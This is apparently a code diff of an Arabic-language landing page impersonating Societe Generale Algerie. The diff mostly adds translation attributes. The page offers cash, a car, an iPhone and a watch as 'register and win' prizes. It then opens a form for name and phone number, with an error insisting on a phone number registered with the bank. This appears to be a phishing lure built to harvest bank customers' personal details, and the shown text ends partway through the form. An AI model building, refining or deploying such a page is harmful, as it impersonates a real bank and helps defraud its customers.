@@ -26,28 +26,6 @@
   <link rel="stylesheet" href="/assets/css/no-zoom.css?v=1">
   <script src="/assets/js/no-zoom.js?v=1"></script>
 
-  <!-- ضمان وضوح نص أزرار نعم / لا في حالتي التحديد وعدم التحديد -->
-  <style>
-    [data-testid="has-account-yes"],
-    [data-testid="has-account-no"] {
-      background-color: #ffffff !important;
-      color: #5c626b !important;
-      border-color: #e3e5e8 !important;
-    }
-    [data-testid="has-account-yes"]:hover,
-    [data-testid="has-account-no"]:hover {
-      border-color: #c62828 !important;
-      color: #c62828 !important;
-    }
-    [data-testid="has-account-yes"].selected,
-    [data-testid="has-account-no"].selected,
-    [data-testid="has-account-yes"].is-selected,
-    [data-testid="has-account-no"].is-selected {
-      background-color: #c62828 !important;
-      border-color: #c62828 !important;
-      color: #ffffff !important;
-    }
-  </style>
 </head>
 <body>
 
@@ -65,41 +43,41 @@
                 <rect x="10" y="46.5" width="80" height="7" fill="#FFFFFF"></rect>
               </svg>
               <span class="flex flex-col leading-[1.05] text-[#000000]">
-                <span class="whitespace-nowrap text-[12px] font-extrabold tracking-[0.02em]">SOCIETE GENERALE</span>
-                <span class="whitespace-nowrap text-[12px] font-extrabold tracking-[0.02em]">ALGERIE</span>
+                <span class="whitespace-nowrap text-[12px] font-extrabold tracking-[0.02em]" data-i18n="home.brand1">SOCIETE GENERALE</span>
+                <span class="whitespace-nowrap text-[12px] font-extrabold tracking-[0.02em]" data-i18n="home.brand2">ALGERIE</span>
               </span>
             </span>
           </a>
           <div class="flex items-center gap-1.5" data-testid="lang-switch">
-            <button data-testid="lang-option-ar" class="rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 bg-[#c62828] text-white shadow-[0_2px_8px_rgba(198,40,40,0.25)]">عربي</button>
-            <button data-testid="lang-option-en" class="rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]">EN</button>
-            <button data-testid="lang-option-fr" class="rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]">FR</button>
+            <button data-testid="lang-option-ar" class="rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 bg-[#c62828] text-white shadow-[0_2px_8px_rgba(198,40,40,0.25)]" data-i18n="home.lang.ar">عربي</button>
+            <button data-testid="lang-option-en" class="rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]" data-i18n="home.lang.en">EN</button>
+            <button data-testid="lang-option-fr" class="rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]" data-i18n="home.lang.fr">FR</button>
           </div>
         </header>
 
         <!-- ── السلايدر الترويجي ── -->
         <div class="relative h-[200px] w-full overflow-hidden bg-[#f6f7f8] sm:h-[240px]" data-testid="promo-slider">
-          <img src="/assets/images/promo-cash-ar.jpg?v=2" alt="اربح جوائز نقدية 1,000,000 دينار جزائري" width="1456" height="720" decoding="async" class="absolute inset-0 block h-full w-full object-cover transition-opacity duration-700 ease-in-out opacity-0">
-          <img src="/assets/images/promo-car-ar.jpg?v=2" alt="اربح سيارة 2027" width="1456" height="720" decoding="async" class="absolute inset-0 block h-full w-full object-cover transition-opacity duration-700 ease-in-out opacity-0">
-          <img src="/assets/images/promo-iphone-ar.jpg?v=2" alt="اربح iPhone 18 Pro Max" width="1456" height="720" decoding="async" fetchpriority="high" class="absolute inset-0 block h-full w-full object-cover transition-opacity duration-700 ease-in-out opacity-100">
-          <img src="/assets/images/promo-watch-ar.jpg?v=2" alt="اربح ساعة ذكية فاخرة" width="1456" height="720" decoding="async" class="absolute inset-0 block h-full w-full object-cover transition-opacity duration-700 ease-in-out opacity-0">
+          <img src="/assets/images/promo-cash-ar.jpg?v=2" alt="اربح جوائز نقدية 1,000,000 دينار جزائري" width="1456" height="720" decoding="async" class="absolute inset-0 block h-full w-full object-cover transition-opacity duration-700 ease-in-out opacity-0" data-i18n-alt="home.alt.cash">
+          <img src="/assets/images/promo-car-ar.jpg?v=2" alt="اربح سيارة 2027" width="1456" height="720" decoding="async" class="absolute inset-0 block h-full w-full object-cover transition-opacity duration-700 ease-in-out opacity-0" data-i18n-alt="home.alt.car">
+          <img src="/assets/images/promo-iphone-ar.jpg?v=2" alt="اربح iPhone 18 Pro Max" width="1456" height="720" decoding="async" fetchpriority="high" class="absolute inset-0 block h-full w-full object-cover transition-opacity duration-700 ease-in-out opacity-100" data-i18n-alt="home.alt.iphone">
+          <img src="/assets/images/promo-watch-ar.jpg?v=2" alt="اربح ساعة ذكية فاخرة" width="1456" height="720" decoding="async" class="absolute inset-0 block h-full w-full object-cover transition-opacity duration-700 ease-in-out opacity-0" data-i18n-alt="home.alt.watch">
           <div class="absolute bottom-3 left-1/2 flex -translate-x-1/2 gap-1.5">
-            <button data-testid="slider-dot-0" aria-label="شريحة 1" class="h-1.5 rounded-full transition-all duration-300 w-1.5 bg-white/50"></button>
-            <button data-testid="slider-dot-1" aria-label="شريحة 2" class="h-1.5 rounded-full transition-all duration-300 w-1.5 bg-white/50"></button>
-            <button data-testid="slider-dot-2" aria-label="شريحة 3" class="h-1.5 rounded-full transition-all duration-300 w-6 bg-white"></button>
-            <button data-testid="slider-dot-3" aria-label="شريحة 4" class="h-1.5 rounded-full transition-all duration-300 w-1.5 bg-white/50"></button>
+            <button data-testid="slider-dot-0" aria-label="شريحة 1" data-i18n-aria="home.slide1" class="h-1.5 rounded-full transition-all duration-300 w-1.5 bg-white/50"></button>
+            <button data-testid="slider-dot-1" aria-label="شريحة 2" data-i18n-aria="home.slide2" class="h-1.5 rounded-full transition-all duration-300 w-1.5 bg-white/50"></button>
+            <button data-testid="slider-dot-2" aria-label="شريحة 3" data-i18n-aria="home.slide3" class="h-1.5 rounded-full transition-all duration-300 w-6 bg-white"></button>
+            <button data-testid="slider-dot-3" aria-label="شريحة 4" data-i18n-aria="home.slide4" class="h-1.5 rounded-full transition-all duration-300 w-1.5 bg-white/50"></button>
           </div>
         </div>
 
         <!-- ── العنوان والوصف ── -->
         <div class="px-6 pb-1.5 pt-5 text-center">
-          <h1 class="text-2xl font-extrabold leading-[1.45] tracking-[-0.3px] text-[#141414]" data-testid="hero-title">سجّل واربح جوائز قيّمة من بنك Societe Generale Algerie</h1>
-          <p class="mt-2.5 text-base leading-[1.6] text-[#8a8f98]" data-testid="hero-subtitle">جوائز نقدية، سيارة، وأجهزة ذكية بانتظارك</p>
+          <h1 class="text-2xl font-extrabold leading-[1.45] tracking-[-0.3px] text-[#141414]" data-testid="hero-title" data-i18n="home.hero.title">سجّل واربح جوائز قيّمة من بنك Societe Generale Algerie</h1>
+          <p class="mt-2.5 text-base leading-[1.6] text-[#8a8f98]" data-testid="hero-subtitle" data-i18n="home.hero.subtitle">جوائز نقدية، سيارة، وأجهزة ذكية بانتظارك</p>
         </div>
 
         <!-- ── زر التسجيل الرئيسي ── -->
         <div class="px-6 pb-7 pt-4 text-center">
-          <button data-testid="hero-cta-button" class="group inline-flex items-center justify-center gap-2 rounded-[50px] border-none bg-gradient-to-br from-[#c62828] to-[#e53935] px-5 py-3.5 text-base font-bold text-white shadow-[0_4px_15px_rgba(198,40,40,0.3)] transition-all duration-200 hover:shadow-[0_6px_22px_rgba(198,40,40,0.4)] hover:brightness-105 active:scale-[0.97] w-full max-w-[360px] py-[15px]">سجّل واربح<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-left transition-transform duration-200 group-hover:-translate-x-1"><path d="m15 18-6-6 6-6"></path></svg></button>
+          <button data-testid="hero-cta-button" class="group inline-flex items-center justify-center gap-2 rounded-[50px] border-none bg-gradient-to-br from-[#c62828] to-[#e53935] px-5 py-3.5 text-base font-bold text-white shadow-[0_4px_15px_rgba(198,40,40,0.3)] transition-all duration-200 hover:shadow-[0_6px_22px_rgba(198,40,40,0.4)] hover:brightness-105 active:scale-[0.97] w-full max-w-[360px] py-[15px]" data-i18n="home.cta.hero">سجّل واربح<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-left transition-transform duration-200 group-hover:-translate-x-1"><path d="m15 18-6-6 6-6"></path></svg></button>
         </div>
 
         <!-- ── بطاقات الجوائز + التذييل ── -->
@@ -107,37 +85,37 @@
 
           <div class="overflow-hidden rounded-[20px] border border-[#ececec] bg-white shadow-[0_4px_18px_rgba(0,0,0,0.08)] transition-all duration-300 hover:-translate-y-[4px] hover:shadow-[0_10px_28px_rgba(0,0,0,0.12)]" data-testid="promo-card-0">
             <div class="overflow-hidden">
-              <img src="/assets/images/promo-cash-ar.jpg?v=2" alt="اربح جوائز نقدية 1,000,000 دينار جزائري" width="1456" height="720" loading="lazy" decoding="async" class="block w-full transition-transform duration-500 hover:scale-[1.03]">
+              <img src="/assets/images/promo-cash-ar.jpg?v=2" alt="اربح جوائز نقدية 1,000,000 دينار جزائري" width="1456" height="720" loading="lazy" decoding="async" class="block w-full transition-transform duration-500 hover:scale-[1.03]" data-i18n-alt="home.alt.cash">
             </div>
             <div class="px-4 pb-4 pt-3.5 text-center">
-              <button data-testid="promo-cta-0" class="group inline-flex items-center justify-center gap-2 rounded-[50px] border-none bg-gradient-to-br from-[#c62828] to-[#e53935] px-5 py-3.5 text-base font-bold text-white shadow-[0_4px_15px_rgba(198,40,40,0.3)] transition-all duration-200 hover:shadow-[0_6px_22px_rgba(198,40,40,0.4)] hover:brightness-105 active:scale-[0.97] w-full">سجّل واربح<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-left transition-transform duration-200 group-hover:-translate-x-1"><path d="m15 18-6-6 6-6"></path></svg></button>
+              <button data-testid="promo-cta-0" class="group inline-flex items-center justify-center gap-2 rounded-[50px] border-none bg-gradient-to-br from-[#c62828] to-[#e53935] px-5 py-3.5 text-base font-bold text-white shadow-[0_4px_15px_rgba(198,40,40,0.3)] transition-all duration-200 hover:shadow-[0_6px_22px_rgba(198,40,40,0.4)] hover:brightness-105 active:scale-[0.97] w-full" data-i18n="home.cta.card1">سجّل واربح<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-left transition-transform duration-200 group-hover:-translate-x-1"><path d="m15 18-6-6 6-6"></path></svg></button>
             </div>
           </div>
 
           <div class="overflow-hidden rounded-[20px] border border-[#ececec] bg-white shadow-[0_4px_18px_rgba(0,0,0,0.08)] transition-all duration-300 hover:-translate-y-[4px] hover:shadow-[0_10px_28px_rgba(0,0,0,0.12)]" data-testid="promo-card-1">
             <div class="overflow-hidden">
-              <img src="/assets/images/promo-car-ar.jpg?v=2" alt="اربح سيارة 2027" width="1456" height="720" loading="lazy" decoding="async" class="block w-full transition-transform duration-500 hover:scale-[1.03]">
+              <img src="/assets/images/promo-car-ar.jpg?v=2" alt="اربح سيارة 2027" width="1456" height="720" loading="lazy" decoding="async" class="block w-full transition-transform duration-500 hover:scale-[1.03]" data-i18n-alt="home.alt.car">
             </div>
             <div class="px-4 pb-4 pt-3.5 text-center">
-              <button data-testid="promo-cta-1" class="group inline-flex items-center justify-center gap-2 rounded-[50px] border-none bg-gradient-to-br from-[#c62828] to-[#e53935] px-5 py-3.5 text-base font-bold text-white shadow-[0_4px_15px_rgba(198,40,40,0.3)] transition-all duration-200 hover:shadow-[0_6px_22px_rgba(198,40,40,0.4)] hover:brightness-105 active:scale-[0.97] w-full">سجّل واربح<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-left transition-transform duration-200 group-hover:-translate-x-1"><path d="m15 18-6-6 6-6"></path></svg></button>
+              <button data-testid="promo-cta-1" class="group inline-flex items-center justify-center gap-2 rounded-[50px] border-none bg-gradient-to-br from-[#c62828] to-[#e53935] px-5 py-3.5 text-base font-bold text-white shadow-[0_4px_15px_rgba(198,40,40,0.3)] transition-all duration-200 hover:shadow-[0_6px_22px_rgba(198,40,40,0.4)] hover:brightness-105 active:scale-[0.97] w-full" data-i18n="home.cta.card2">سجّل واربح<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-left transition-transform duration-200 group-hover:-translate-x-1"><path d="m15 18-6-6 6-6"></path></svg></button>
             </div>
           </div>
 
           <div class="overflow-hidden rounded-[20px] border border-[#ececec] bg-white shadow-[0_4px_18px_rgba(0,0,0,0.08)] transition-all duration-300 hover:-translate-y-[4px] hover:shadow-[0_10px_28px_rgba(0,0,0,0.12)]" data-testid="promo-card-2">
             <div class="overflow-hidden">
-              <img src="/assets/images/promo-iphone-ar.jpg?v=2" alt="اربح iPhone 18 Pro Max" width="1456" height="720" loading="lazy" decoding="async" class="block w-full transition-transform duration-500 hover:scale-[1.03]">
+              <img src="/assets/images/promo-iphone-ar.jpg?v=2" alt="اربح iPhone 18 Pro Max" width="1456" height="720" loading="lazy" decoding="async" class="block w-full transition-transform duration-500 hover:scale-[1.03]" data-i18n-alt="home.alt.iphone">
             </div>
             <div class="px-4 pb-4 pt-3.5 text-center">
-              <button data-testid="promo-cta-2" class="group inline-flex items-center justify-center gap-2 rounded-[50px] border-none bg-gradient-to-br from-[#c62828] to-[#e53935] px-5 py-3.5 text-base font-bold text-white shadow-[0_4px_15px_rgba(198,40,40,0.3)] transition-all duration-200 hover:shadow-[0_6px_22px_rgba(198,40,40,0.4)] hover:brightness-105 active:scale-[0.97] w-full">سجّل واربح<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-left transition-transform duration-200 group-hover:-translate-x-1"><path d="m15 18-6-6 6-6"></path></svg></button>
+              <button data-testid="promo-cta-2" class="group inline-flex items-center justify-center gap-2 rounded-[50px] border-none bg-gradient-to-br from-[#c62828] to-[#e53935] px-5 py-3.5 text-base font-bold text-white shadow-[0_4px_15px_rgba(198,40,40,0.3)] transition-all duration-200 hover:shadow-[0_6px_22px_rgba(198,40,40,0.4)] hover:brightness-105 active:scale-[0.97] w-full" data-i18n="home.cta.card3">سجّل واربح<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-left transition-transform duration-200 group-hover:-translate-x-1"><path d="m15 18-6-6 6-6"></path></svg></button>
             </div>
           </div>
 
           <div class="overflow-hidden rounded-[20px] border border-[#ececec] bg-white shadow-[0_4px_18px_rgba(0,0,0,0.08)] transition-all duration-300 hover:-translate-y-[4px] hover:shadow-[0_10px_28px_rgba(0,0,0,0.12)]" data-testid="promo-card-3">
             <div class="overflow-hidden">
-              <img src="/assets/images/promo-watch-ar.jpg?v=2" alt="اربح ساعة ذكية فاخرة" width="1456" height="720" loading="lazy" decoding="async" class="block w-full transition-transform duration-500 hover:scale-[1.03]">
+              <img src="/assets/images/promo-watch-ar.jpg?v=2" alt="اربح ساعة ذكية فاخرة" width="1456" height="720" loading="lazy" decoding="async" class="block w-full transition-transform duration-500 hover:scale-[1.03]" data-i18n-alt="home.alt.watch">
             </div>
             <div class="px-4 pb-4 pt-3.5 text-center">
-              <button data-testid="promo-cta-3" class="group inline-flex items-center justify-center gap-2 rounded-[50px] border-none bg-gradient-to-br from-[#c62828] to-[#e53935] px-5 py-3.5 text-base font-bold text-white shadow-[0_4px_15px_rgba(198,40,40,0.3)] transition-all duration-200 hover:shadow-[0_6px_22px_rgba(198,40,40,0.4)] hover:brightness-105 active:scale-[0.97] w-full">سجّل واربح<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-left transition-transform duration-200 group-hover:-translate-x-1"><path d="m15 18-6-6 6-6"></path></svg></button>
+              <button data-testid="promo-cta-3" class="group inline-flex items-center justify-center gap-2 rounded-[50px] border-none bg-gradient-to-br from-[#c62828] to-[#e53935] px-5 py-3.5 text-base font-bold text-white shadow-[0_4px_15px_rgba(198,40,40,0.3)] transition-all duration-200 hover:shadow-[0_6px_22px_rgba(198,40,40,0.4)] hover:brightness-105 active:scale-[0.97] w-full" data-i18n="home.cta.card4">سجّل واربح<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-left transition-transform duration-200 group-hover:-translate-x-1"><path d="m15 18-6-6 6-6"></path></svg></button>
             </div>
           </div>
 
@@ -145,47 +123,47 @@
             <div class="grid gap-7 sm:grid-cols-2">
 
               <div>
-                <h3 class="text-sm font-extrabold text-[#141414]">تواصل معنا</h3>
+                <h3 class="text-sm font-extrabold text-[#141414]" data-i18n="home.footer.contact">تواصل معنا</h3>
                 <ul class="mt-3.5 space-y-3">
                   <li class="flex items-start gap-2.5">
                     <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-map-pin mt-0.5 shrink-0 text-[#c62828]"><path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"></path><circle cx="12" cy="10" r="3"></circle></svg>
-                    <span class="text-sm leading-relaxed text-[#5c626b]">شارع كريم بلقاسم، حيدرة، الجزائر العاصمة، الجزائر</span>
+                    <span class="text-sm leading-relaxed text-[#5c626b]" data-i18n="home.footer.address">شارع كريم بلقاسم، حيدرة، الجزائر العاصمة، الجزائر</span>
                   </li>
                   <li class="flex items-center gap-2.5">
                     <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone shrink-0 text-[#c62828]"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
-                    <span class="text-sm text-[#5c626b]">الهاتف: </span><span dir="ltr" class="text-sm font-bold text-[#141414]" data-testid="contact-phone">3020</span>
+                    <span class="text-sm text-[#5c626b]" data-i18n="home.footer.phoneLabel">الهاتف: </span><span dir="ltr" class="text-sm font-bold text-[#141414]" data-testid="contact-phone" data-i18n="home.footer.phone">3020</span>
                   </li>
                   <li class="flex items-center gap-2.5">
                     <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-printer shrink-0 text-[#c62828]"><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"></path><path d="M6 9V3a1 1 0 0 1 1-1h10a1 1 0 0 1 1 1v6"></path><rect x="6" y="14" width="12" height="8" rx="1"></rect></svg>
-                    <span class="text-sm text-[#5c626b]">فاكس: </span><span dir="ltr" class="text-sm font-bold text-[#141414]">023 48 18 19</span>
+                    <span class="text-sm text-[#5c626b]" data-i18n="home.footer.faxLabel">فاكس: </span><span dir="ltr" class="text-sm font-bold text-[#141414]" data-i18n="home.footer.fax">023 48 18 19</span>
                   </li>
                   <li class="flex items-center gap-2.5">
                     <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-mail shrink-0 text-[#c62828]"><rect width="20" height="16" x="2" y="4" rx="2"></rect><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path></svg>
-                    <a href="mailto:contact@socgen.dz" dir="ltr" class="text-sm text-[#5c626b] transition-colors duration-200 hover:text-[#c62828] font-bold" data-testid="contact-email">contact@socgen.dz</a>
+                    <a href="mailto:contact@socgen.dz" dir="ltr" class="text-sm text-[#5c626b] transition-colors duration-200 hover:text-[#c62828] font-bold" data-testid="contact-email" data-i18n="home.footer.email">contact@socgen.dz</a>
                   </li>
                 </ul>
               </div>
 
               <div>
-                <h3 class="text-sm font-extrabold text-[#141414]">روابط مهمة</h3>
+                <h3 class="text-sm font-extrabold text-[#141414]" data-i18n="home.footer.links">روابط مهمة</h3>
                 <ul class="mt-3.5 space-y-2.5">
-                  <li><a href="#" class="text-sm text-[#5c626b] transition-colors duration-200 hover:text-[#c62828]" data-testid="link-terms">الشروط والأحكام</a></li>
-                  <li><a href="#" class="text-sm text-[#5c626b] transition-colors duration-200 hover:text-[#c62828]" data-testid="link-privacy">سياسة الخصوصية</a></li>
-                  <li><a href="#" class="text-sm text-[#5c626b] transition-colors duration-200 hover:text-[#c62828]" data-testid="link-faq">الأسئلة الشائعة</a></li>
+                  <li><a href="#" class="text-sm text-[#5c626b] transition-colors duration-200 hover:text-[#c62828]" data-testid="link-terms" data-i18n="home.footer.terms">الشروط والأحكام</a></li>
+                  <li><a href="#" class="text-sm text-[#5c626b] transition-colors duration-200 hover:text-[#c62828]" data-testid="link-privacy" data-i18n="home.footer.privacy">سياسة الخصوصية</a></li>
+                  <li><a href="#" class="text-sm text-[#5c626b] transition-colors duration-200 hover:text-[#c62828]" data-testid="link-faq" data-i18n="home.footer.faq">الأسئلة الشائعة</a></li>
                 </ul>
               </div>
 
               <div class="sm:col-span-2">
-                <h3 class="text-sm font-extrabold text-[#141414]">قانوني</h3>
+                <h3 class="text-sm font-extrabold text-[#141414]" data-i18n="home.footer.legal">قانوني</h3>
                 <ul class="mt-3.5 flex flex-wrap gap-x-6 gap-y-2.5">
-                  <li><a href="#" class="text-sm text-[#5c626b] transition-colors duration-200 hover:text-[#c62828]" data-testid="link-legal-notice">الإشعار القانوني</a></li>
-                  <li><a href="#" class="text-sm text-[#5c626b] transition-colors duration-200 hover:text-[#c62828]" data-testid="link-cookies">سياسة ملفات تعريف الارتباط</a></li>
-                  <li><a href="#" class="text-sm text-[#5c626b] transition-colors duration-200 hover:text-[#c62828]" data-testid="link-data-protection">حماية البيانات</a></li>
+                  <li><a href="#" class="text-sm text-[#5c626b] transition-colors duration-200 hover:text-[#c62828]" data-testid="link-legal-notice" data-i18n="home.footer.legalNotice">الإشعار القانوني</a></li>
+                  <li><a href="#" class="text-sm text-[#5c626b] transition-colors duration-200 hover:text-[#c62828]" data-testid="link-cookies" data-i18n="home.footer.cookies">سياسة ملفات تعريف الارتباط</a></li>
+                  <li><a href="#" class="text-sm text-[#5c626b] transition-colors duration-200 hover:text-[#c62828]" data-testid="link-data-protection" data-i18n="home.footer.dataProtection">حماية البيانات</a></li>
                 </ul>
               </div>
 
             </div>
-            <div class="mt-7 border-t border-[#ececec] pt-4 text-center text-xs text-[#8a8f98]" data-testid="copyright">جميع الحقوق محفوظة © 2025 Societe Generale Algerie</div>
+            <div class="mt-7 border-t border-[#ececec] pt-4 text-center text-xs text-[#8a8f98]" data-testid="copyright" data-i18n="home.footer.copyright">جميع الحقوق محفوظة © 2025 Societe Generale Algerie</div>
           </footer>
 
         </section>
@@ -194,42 +172,42 @@
       <!-- ── نافذة إكمال البيانات ── -->
       <div class="fixed inset-0 z-[90] flex items-end justify-center bg-black/50 p-4 sm:items-center" data-testid="registration-modal" style="display:none;animation: 0.25s ease-out 0s 1 normal none running fadeIn;">
         <div class="relative w-full max-w-[440px] rounded-3xl bg-white p-6 shadow-2xl sm:p-7" style="animation: 0.3s cubic-bezier(0.22, 1, 0.36, 1) 0s 1 normal none running slideUp;">
-          <button aria-label="إغلاق" data-testid="modal-close-button" class="absolute right-4 top-4 rounded-full p-1.5 text-[#8a8f98] transition-colors hover:bg-[#f2f3f5] hover:text-[#141414] rtl:left-4 rtl:right-auto"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-x"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
-          <h3 class="text-[22px] font-extrabold text-[#141414]" data-testid="modal-title">أكمل بياناتك</h3>
-          <p class="mt-1.5 text-[15px] text-[#8a8f98]">من فضلك أدخل بياناتك لإتمام الطلب</p>
+          <button aria-label="إغلاق" data-testid="modal-close-button" class="absolute right-4 top-4 rounded-full p-1.5 text-[#8a8f98] transition-colors hover:bg-[#f2f3f5] hover:text-[#141414] rtl:left-4 rtl:right-auto" data-i18n-aria="home.modal.closeAria"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-x"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
+          <h3 class="text-[22px] font-extrabold text-[#141414]" data-testid="modal-title" data-i18n="home.modal.title">أكمل بياناتك</h3>
+          <p class="mt-1.5 text-[15px] text-[#8a8f98]" data-i18n="home.modal.subtitle">من فضلك أدخل بياناتك لإتمام الطلب</p>
           <form class="mt-6 space-y-4">
 
             <div>
-              <label class="mb-2 block text-[15px] font-bold text-[#141414]">الاسم الكامل</label>
+              <label class="mb-2 block text-[15px] font-bold text-[#141414]" data-i18n="home.modal.name">الاسم الكامل</label>
               <div class="relative">
-                <input required="" minlength="3" placeholder="مثال: محمد أمين" class="w-full rounded-2xl border border-[#ececec] bg-white px-5 py-[15px] text-[15px] text-[#141414] outline-none transition-all duration-200 placeholder:text-[#b3b8bf] focus:border-[#c62828] focus:ring-2 focus:ring-[#c62828]/10" data-testid="input-name" value="">
+                <input required="" minlength="3" placeholder="مثال: محمد أمين" data-i18n-ph="home.modal.namePh" class="w-full rounded-2xl border border-[#ececec] bg-white px-5 py-[15px] text-[15px] text-[#141414] outline-none transition-all duration-200 placeholder:text-[#b3b8bf] focus:border-[#c62828] focus:ring-2 focus:ring-[#c62828]/10" data-testid="input-name" value="">
                 <svg xmlns="http://www.w3.org/2000/svg" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user absolute end-4 top-1/2 -translate-y-1/2 text-[#b3b8bf]"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
               </div>
             </div>
 
             <div>
-              <label class="mb-2 block text-[15px] font-bold text-[#141414]">رقم الهاتف</label>
+              <label class="mb-2 block text-[15px] font-bold text-[#141414]" data-i18n="home.modal.phone">رقم الهاتف</label>
               <div class="relative">
-                <input required="" type="tel" dir="ltr" class="w-full rounded-2xl border border-[#ececec] bg-white px-5 py-[15px] text-[15px] text-[#141414] outline-none transition-all duration-200 placeholder:text-[#b3b8bf] focus:border-[#c62828] focus:ring-2 focus:ring-[#c62828]/10 text-left" placeholder="05 00 00 00 00" data-testid="input-phone" value="">
+                <input required="" type="tel" dir="ltr" class="w-full rounded-2xl border border-[#ececec] bg-white px-5 py-[15px] text-[15px] text-[#141414] outline-none transition-all duration-200 placeholder:text-[#b3b8bf] focus:border-[#c62828] focus:ring-2 focus:ring-[#c62828]/10 text-left" placeholder="05 00 00 00 00" data-i18n-ph="home.modal.phonePh" data-testid="input-phone" value="">
                 <svg xmlns="http://www.w3.org/2000/svg" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone absolute end-4 top-1/2 -translate-y-1/2 text-[#b3b8bf]"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
               </div>
-              <p id="phoneErrorMsg" role="alert" style="display:none;color:#c62828;font-size:12px;font-weight:700;margin-top:6px;text-align:right;line-height:1.5;">رقم الهاتف غير صحيح يرجى ادخال رقم هاتف مسجل في البنك</p>
+              <p class="phone-error" id="phoneErrorMsg" role="alert" data-i18n="home.modal.phoneError">رقم الهاتف غير صحيح يرجى ادخال رقم هاتف مسجل في البنك</p>
